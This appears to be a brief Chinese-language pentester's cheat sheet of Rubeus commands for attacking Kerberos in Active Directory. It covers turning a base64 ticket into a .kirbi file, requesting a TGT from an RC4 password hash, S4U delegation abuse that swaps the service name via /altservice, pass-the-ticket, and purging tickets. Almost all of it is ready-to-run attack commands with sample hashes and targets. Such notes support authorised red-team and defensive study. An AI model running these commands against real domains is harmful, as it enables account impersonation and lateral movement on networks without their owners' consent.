理论部分参考[这篇文章](https://www.anquanke.com/post/id/161781)

# base64转成票据（PS操作）

```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nlamb.kirbi", [Convert]::FromBase64String("doIFZzC..."))
```

# 根据哈希请求票据

```
Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
```


# /altservice
**/altservice** 参数利用了 Alberto Solino‘s 的伟大发现，即 服务名称在KRB-CRED文件中不被保护 ，只有服务器名称才被保护。这就允许我们在生成的KRB-CRED（.kirbi）文件中替换我们想要的任何服务名称

```
Rubeus.exe s4u /ticket:C:TempTicketspatsy.kirbi /impersonateuser:dfm.a /msdsspn:ldap/primary.testlab.local /altservice:cifs /ptt
```

# ptt
```
Rubeus.exe ptt /ticket:doIFmj...(snip)...
```


# 清除所有登录会话
```
Rubeus.exe purge
```
